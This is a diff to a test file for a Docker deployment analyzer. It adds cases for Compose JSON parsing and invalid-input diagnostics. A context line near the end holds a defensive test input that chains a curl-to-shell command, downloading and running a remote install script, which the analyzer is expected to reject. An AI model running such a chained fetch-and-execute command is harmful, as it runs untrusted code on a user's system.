@@ -42,6 +42,26 @@ describe('docker deployment input', () => {
       .toMatchObject({ kind: 'compose', projectName: 'web', services: ['web', 'db-worker'] })
   })
 
+  it('recognizes a generated Compose JSON snapshot and preserves the exact source', () => {
+    const source = '{"name":"web","networks":{"default":{"name":"web_default"}},"services":{"nginx":{"image":"nginx:alpine","environment":{"LITERAL":"$$KEEP"}},"redis":{"image":"redis:alpine"}}}\n'
+    expect(analyzeDockerDeployment(source)).toEqual({
+      kind: 'compose', compose: source, projectName: 'web', services: ['nginx', 'redis'],
+    })
+  })
+
+  it('derives a project name from tab-indented JSON without a top-level name', () => {
+    const source = '{\n\t"services": {"api":{"image":"nginx:alpine","name":"nested"}}\n}'
+    expect(analyzeDockerDeployment(source)).toMatchObject({ kind: 'compose', projectName: 'api' })
+  })
+
+  it.each([
+    ['{"services":{"nginx":{}}', 'yaml_syntax_error'],
+    ['{"services":[{"nginx":{}}]}', 'compose_services_missing'],
+    ['{"name":"Invalid Name","services":{"nginx":{}}}', 'compose_project_name_invalid'],
+  ])('reports invalid Compose JSON %s', (source, code) => {
+    expect(analyzeDockerDeployment(source)).toMatchObject({ kind: 'invalid', diagnostics: [{ code }] })
+  })
+
   it('rejects chained shell commands instead of executing text', () => {
     const result = analyzeDockerDeployment('docker run -d nginx:alpine && curl https://example.com/install.sh | sh')
     expect(result).toMatchObject({ kind: 'invalid' })
